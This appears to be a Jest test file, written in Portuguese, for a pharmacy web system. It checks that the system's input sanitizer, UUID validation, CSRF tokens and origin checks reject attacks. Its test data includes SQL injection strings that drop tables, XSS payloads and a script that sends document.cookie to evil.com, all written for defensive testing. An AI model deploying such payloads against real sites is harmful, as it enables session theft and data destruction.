/**
 * Testes de Vulnerabilidades - Sistema de Farmácia
 * 
 * Testa proteções contra SQL Injection, XSS e CSRF
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import express from 'express';
import { validateCSRFToken, generateCSRFToken } from '../../presentation/middleware/csrfProtection';
import { Sanitizer } from '../../presentation/middleware/sanitizer';
import { ComprasServiceSeguro } from '../../application/services/ComprasServiceSeguro';

describe('Testes de Vulnerabilidades', () => {

  describe('Proteção contra SQL Injection', () => {
    let comprasService: ComprasServiceSeguro;

    beforeAll(() => {
      comprasService = new ComprasServiceSeguro();
    });

    test('deve rejeitar ID inválido (não UUID)', async () => {
      const idMalicioso = "'; DROP TABLE pedidos; --";
      
      await expect(
        comprasService.buscarPedidoPorId(idMalicioso)
      ).rejects.toThrow('ID inválido');
    });

    test('deve validar UUIDs corretamente', async () => {
      const uuidValido = '123e4567-e89b-12d3-a456-426614174000';
      
      // Não deve lançar erro de validação de UUID
      try {
        await comprasService.buscarPedidoPorId(uuidValido);
      } catch (error: any) {
        // Pode falhar por outros motivos (pedido não encontrado),
        // mas não deve ser erro de ID inválido
        expect(error.message).not.toBe('ID inválido');
      }
    });

    test('deve usar queries parametrizadas', () => {
      // Verificar se o service usa Prisma.sql corretamente
      const servicePath = require.resolve('../../application/services/ComprasServiceSeguro');
      const serviceCode = require('fs').readFileSync(servicePath, 'utf8');
      
      // Deve conter Prisma.sql
      expect(serviceCode).toContain('Prisma.sql');
      
      // Não deve conter concatenação de strings SQL perigosa
      expect(serviceCode).not.toMatch(/\$\{.*\}.*WHERE/);
      expect(serviceCode).not.toMatch(/\+.*WHERE/);
    });
  });

  describe('Proteção contra XSS', () => {
    test('deve remover scripts maliciosos', () => {
      const inputMalicioso = '<script>alert("XSS")</script>Conteúdo legítimo';
      const resultado = Sanitizer.stripHTML(inputMalicioso);
      
      expect(resultado).toBe('Conteúdo legítimo');
      expect(resultado).not.toContain('<script>');
      expect(resultado).not.toContain('alert');
    });

    test('deve remover event handlers', () => {
      const inputMalicioso = '<div onclick="alert(\'XSS\')">Clique aqui</div>';
      const resultado = Sanitizer.stripHTML(inputMalicioso);
      
      expect(resultado).toBe('Clique aqui');
      expect(resultado).not.toContain('onclick');
    });

    test('deve remover iframes maliciosos', () => {
      const inputMalicioso = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const resultado = Sanitizer.stripHTML(inputMalicioso);
      
      expect(resultado).toBe('');
      expect(resultado).not.toContain('iframe');
      expect(resultado).not.toContain('javascript:');
    });

    test('deve escapar caracteres especiais', () => {
      const input = '<div>Test & "quotes" > text</div>';
      const resultado = Sanitizer.escapeHTML(input);
      
      expect(resultado).toContain('&lt;');
      expect(resultado).toContain('&gt;');
      expect(resultado).toContain('&amp;');
      expect(resultado).toContain('&quot;');
    });

    test('deve sanitizar objetos complexos recursivamente', () => {
      const objetoMalicioso = {
        nome: '<script>alert("hack")</script>João',
        descricao: '<img src=x onerror="alert(\'XSS\')">',
        dados: {
          comentario: '<iframe src="evil.com"></iframe>Texto seguro'
        }
      };

      const resultado = Sanitizer.sanitizeObject(objetoMalicioso);
      
      expect(resultado.nome).toBe('João');
      expect(resultado.descricao).toBe('');
      expect(resultado.dados.comentario).toBe('Texto seguro');
    });
  });

  describe('Proteção CSRF', () => {
    let app: express.Application;

    beforeAll(() => {
      app = express();
      app.use(express.json());
      
      // Rota para obter token
      app.get('/csrf-token', generateCSRFToken, (req: any, res) => {
        res.json({ csrfToken: req.csrfToken });
      });
      
      // Rota protegida por CSRF
      app.post('/protected', validateCSRFToken, (req, res) => {
        res.json({ message: 'Sucesso!' });
      });

      // Rota GET (não protegida por CSRF)
      app.get('/safe', (req, res) => {
        res.json({ message: 'GET é seguro' });
      });
    });

    test('deve permitir requisições GET sem token CSRF', async () => {
      const response = await request(app)
        .get('/safe')
        .expect(200);
        
      expect(response.body.message).toBe('GET é seguro');
    });

    test('deve gerar token CSRF para requisições GET', async () => {
      const response = await request(app)
        .get('/csrf-token')
        .expect(200);
        
      expect(response.body.csrfToken).toBeDefined();
      expect(typeof response.body.csrfToken).toBe('string');
      expect(response.body.csrfToken).toHaveLength(64); // 32 bytes em hex
    });

    test('deve rejeitar POST sem token CSRF', async () => {
      await request(app)
        .post('/protected')
        .send({ data: 'test' })
        .expect(403);
    });

    test('deve rejeitar POST com token CSRF inválido', async () => {
      await request(app)
        .post('/protected')
        .set('X-CSRF-Token', 'token-invalido')
        .send({ data: 'test' })
        .expect(403);
    });

    test('deve aceitar POST com token CSRF válido', async () => {
      // Simular obtenção de token
      const tokenResponse = await request(app)
        .get('/csrf-token');
        
      const token = tokenResponse.body.csrfToken;
      
      // Usar token em requisição POST
      await request(app)
        .post('/protected')
        .set('X-CSRF-Token', token)
        .send({ data: 'test' })
        .expect(200);
    });
  });

  describe('Testes de Integração', () => {
    test('deve detectar múltiplas vulnerabilidades simultaneamente', () => {
      const dadosPerigosos = {
        sql: "'; DROP TABLE usuarios; --",
        xss: '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
        html: '<iframe src="javascript:alert(1)"></iframe>',
        mixed: '<script>eval("malicious code")</script>Texto normal'
      };

      const resultado = Sanitizer.sanitizeObject(dadosPerigosos);
      
      // XSS deve ser removido
      expect(resultado.xss).toBe('');
      expect(resultado.html).toBe('');
      expect(resultado.mixed).toBe('Texto normal');
      
      // SQL injection ainda presente (precisa ser tratado em contexto específico)
      expect(resultado.sql).toContain('DROP'); // sanitizeObject só remove HTML
    });

    test('deve validar entrada completa de formulário', () => {
      const formularioMalicioso = {
        nome: 'João<script>alert("XSS")</script>',
        email: 'test@example.com<img src=x onerror="alert(1)">',
        comentario: '"; DROP TABLE comments; --',
        descricao: '<iframe src="evil.com"></iframe>Descrição legítima'
      };

      const resultado = Sanitizer.sanitizeObject(formularioMalicioso);
      
      expect(resultado.nome).toBe('João');
      expect(resultado.email).toBe('test@example.com');
      expect(resultado.descricao).toBe('Descrição legítima');
      
      // Para SQL injection, usar sanitizeSQL separadamente
      const sqlSeguro = Sanitizer.sanitizeSQL(resultado.comentario);
      expect(sqlSeguro).not.toContain('DROP');
      expect(sqlSeguro).not.toContain('--');
    });
  });

  describe('Validação de Origem e Referrer', () => {
    let app: express.Application;

    beforeAll(() => {
      app = express();
      app.use(express.json());
      
      // Middleware de validação de origem
      app.use((req, res, next) => {
        if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
          const referer = req.headers.referer;
          const origin = req.headers.origin;
          
          const allowedOrigins = ['http://localhost:3000', 'https://farmacia.exemplo.com'];
          const requestOrigin = origin || (referer && new URL(referer).origin);
          
          if (requestOrigin && !allowedOrigins.includes(requestOrigin)) {
            return res.status(403).json({ error: 'Origem não permitida' });
          }
        }
        next();
      });
      
      app.post('/test-origin', (req, res) => {
        res.json({ message: 'Origem válida' });
      });
    });

    test('deve rejeitar requisições de origem não autorizada', async () => {
      await request(app)
        .post('/test-origin')
        .set('Origin', 'http://evil.com')
        .send({ data: 'test' })
        .expect(403);
    });

    test('deve aceitar requisições de origem autorizada', async () => {
      await request(app)
        .post('/test-origin')
        .set('Origin', 'http://localhost:3000')
        .send({ data: 'test' })
        .expect(200);
    });

    test('deve aceitar requisições sem origem (mesma origem)', async () => {
      await request(app)
        .post('/test-origin')
        .send({ data: 'test' })
        .expect(200);
    });
  });
});